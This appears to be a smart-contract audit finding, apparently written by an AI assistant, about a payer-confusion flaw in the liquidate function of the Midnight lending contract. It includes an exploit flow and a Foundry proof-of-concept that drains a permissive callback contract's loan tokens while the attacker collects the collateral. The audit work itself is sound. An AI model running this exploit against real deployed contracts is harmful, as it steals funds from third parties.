The code path is fully clear. Let me confirm the exact lines and write the finding.

### Title
Unprivileged liquidator can designate an arbitrary contract as payer, draining its loan tokens while receiving seized collateral - (`src/Midnight.sol`)

### Summary
In `Midnight.liquidate`, the `payer` for loan-token repayment is set to the caller-supplied `callback` address with no check that `msg.sender` is authorized by that address. An attacker can pass any contract that implements `ILiquidateCallback` (returning `CALLBACK_SUCCESS`) and has approved Midnight as the `callback`, causing that contract's loan tokens to be pulled while the attacker's chosen `receiver` receives the seized collateral.

### Finding Description

**Exact code path — `src/Midnight.sol` lines 679–717:**

```
address payer = callback != address(0) ? callback : msg.sender;   // L679
...
SafeTransferLib.safeTransfer(collateralToken, receiver, seizedAssets);  // L696 — collateral out first
if (callback != address(0)) {
    require(ILiquidateCallback(callback).onLiquidate(...) == CALLBACK_SUCCESS, ...); // L700-714
}
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits); // L717
``` [1](#0-0) [2](#0-1) 

**Root cause:** There is no check anywhere in `liquidate` that `callback == msg.sender` or that `isAuthorized[callback][msg.sender]` is true. The `callback` parameter is fully attacker-controlled. [3](#0-2) 

**Attacker inputs:**
- `callback = victimContract` — any contract that (a) implements `ILiquidateCallback` returning `CALLBACK_SUCCESS` and (b) has a standing `approve(midnight, type(uint256).max)` for the loan token
- `receiver = attackerWallet` — attacker-controlled address to receive collateral
- `postMaturityMode = true`, `block.timestamp > market.maturity` — satisfies the liquidatability check at line 622

**Exploit flow:**
1. Advance time past `market.maturity`.
2. Attacker calls `midnight.liquidate(market, collateralIndex, seizedAssets, 0, borrower, true, attackerWallet, victimContract, data)`.
3. `payer` is set to `victimContract` (line 679).
4. `seizedAssets` collateral is transferred to `attackerWallet` (line 696).
5. `victimContract.onLiquidate(...)` is called; it returns `CALLBACK_SUCCESS` (line 700–714).
6. `repaidUnits` loan tokens are pulled from `victimContract` via `transferFrom` (line 717).

**Why existing checks fail:**
- The `liquidatorGate` check (line 597–600) only gates whether `msg.sender` can liquidate at all — it does not restrict the `callback` parameter. [4](#0-3) 
- The `isAuthorized` mapping is never consulted for the `callback`/`payer` relationship in `liquidate`. [1](#0-0) 
- The Certora spec `OnlyExplicitPayerCanLoseTokens.spec` models this as acceptable (tokens pulled from "a callback that returned CALLBACK_SUCCESS"), but does not verify that the callback consented to acting as payer for an arbitrary `msg.sender`. [5](#0-4) 

### Impact Explanation
An unprivileged attacker receives seized collateral at the victim contract's expense. The victim contract pays `repaidUnits` loan tokens without initiating or consenting to the liquidation. This directly violates the invariant that the liquidator must supply repayment tokens. Any contract that (a) implements `ILiquidateCallback` permissively and (b) holds a Midnight approval is at risk of total loan-token drainage.

### Likelihood Explanation
**Preconditions:**
1. `block.timestamp > market.maturity` — trivially reachable after any market expires.
2. A victim contract implements `ILiquidateCallback` returning `CALLBACK_SUCCESS` without checking that `caller` (the `msg.sender` passed in) is authorized — common for liquidation routers, aggregators, or any contract that uses the callback pattern to receive collateral and then repay.
3. The victim contract has approved Midnight for the loan token — required for normal operation of any such contract.

All three preconditions are realistic in production. The attack is repeatable for every expired market where such a contract exists, and requires no special privilege.

### Recommendation
Add an authorization check before accepting an arbitrary `callback` as `payer`. Specifically, require that the callback address has authorized `msg.sender`:

```solidity
if (callback != address(0)) {
    require(callback == msg.sender || isAuthorized[callback][msg.sender], Unauthorized());
}
address payer = callback != address(0) ? callback : msg.sender;
```

This mirrors the pattern already used in `withdrawCollateral` and `setConsumed` for authorization. [6](#0-5) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market, ...} from "src/Midnight.sol";
import {ILiquidateCallback} from "src/interfaces/ICallbacks.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// Victim: a permissive liquidation router that has approved Midnight
contract VictimLiquidationRouter is ILiquidateCallback {
    address public midnight;
    address public loanToken;

    constructor(address _midnight, address _loanToken) {
        midnight = _midnight;
        loanToken = _loanToken;
        ERC20(_loanToken).approve(_midnight, type(uint256).max);
    }

    function onLiquidate(
        address, bytes32, Market memory, uint256, uint256, uint256,
        address, address, bytes memory, uint256
    ) external returns (bytes32) {
        // No caller check — common pattern
        return CALLBACK_SUCCESS;
    }
}

contract PayerConfusionTest is Test {
    function testLiquidatorDrainsVictimPayer() public {
        // Setup: create market, borrower takes debt, advance past maturity
        // ...
        vm.warp(market.maturity + 1);

        // Fund victim with loan tokens (simulating its normal operating balance)
        deal(market.loanToken, address(victim), repaidUnits);

        uint256 attackerCollateralBefore = ERC20(collateralToken).balanceOf(attacker);
        uint256 victimLoanBefore = ERC20(market.loanToken).balanceOf(address(victim));

        vm.prank(attacker);
        midnight.liquidate(
            market, 0, seizedAssets, 0, borrower,
            true,           // postMaturityMode
            attacker,       // receiver — attacker gets collateral
            address(victim),// callback — victim pays
            ""
        );

        // ASSERTIONS:
        // Attacker received collateral
        assertGt(ERC20(collateralToken).balanceOf(attacker), attackerCollateralBefore);
        // Victim's loan tokens were drained
        assertLt(ERC20(market.loanToken).balanceOf(address(victim)), victimLoanBefore);
        // Attacker spent zero loan tokens
        assertEq(ERC20(market.loanToken).balanceOf(attacker), 0);
    }
}
```

### Citations

**File:** src/Midnight.sol (L556-556)
```text
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
```

**File:** src/Midnight.sol (L581-600)
```text
    function liquidate(
        Market calldata market,
        uint256 collateralIndex,
        uint256 seizedAssets,
        uint256 repaidUnits,
        address borrower,
        bool postMaturityMode,
        address receiver,
        address callback,
        bytes calldata data
    ) external returns (uint256, uint256) {
        bytes32 id = touchMarket(market);
        MarketState storage _marketState = marketState[id];
        Position storage _position = position[id][borrower];
        require(UtilsLib.atMostOneNonZero(repaidUnits, seizedAssets), InconsistentInput());
        require(_position.debt > 0, NotBorrower()); // to avoid no-op liquidations of non borrower positions.
        require(
            market.liquidatorGate == address(0) || ILiquidatorGate(market.liquidatorGate).canLiquidate(msg.sender),
            LiquidatorGatedFromLiquidating()
        );
```

**File:** src/Midnight.sol (L679-679)
```text
        address payer = callback != address(0) ? callback : msg.sender;
```

**File:** src/Midnight.sol (L696-717)
```text
        SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);

        if (callback != address(0)) {
            require(
                ILiquidateCallback(callback)
                    .onLiquidate(
                        msg.sender,
                        id,
                        market,
                        collateralIndex,
                        seizedAssets,
                        repaidUnits,
                        borrower,
                        receiver,
                        data,
                        badDebt
                    ) == CALLBACK_SUCCESS,
                WrongLiquidateCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits);
```

**File:** certora/specs/OnlyExplicitPayerCanLoseTokens.spec (L119-135)
```text
rule otherEntryPointsOnlyPullFromCaller(method f, env e, calldataarg args) filtered { f -> !f.isView && f.selector != sig:take(Midnight.Offer, bytes, uint256, address, address, address, bytes).selector } {
    require e.msg.sender != currentContract, "only external calls";

    msgSender = e.msg.sender;
    msgSenderAllowed = true;
    callbackAllowed = false;
    makerAllowed = false;

    buyCallbackAllowed = false;
    liquidateCallbackAllowed = f.selector == sig:liquidate(Midnight.Market, uint256, uint256, uint256, address, bool, address, address, bytes).selector;
    repayCallbackAllowed = f.selector == sig:repay(Midnight.Market, uint256, address, address, bytes).selector;
    flashLoanCallbackAllowed = f.selector == sig:flashLoan(address[], uint256[], address, bytes).selector;
    badPullSeen = false;

    f(e, args);

    assert !badPullSeen;
```
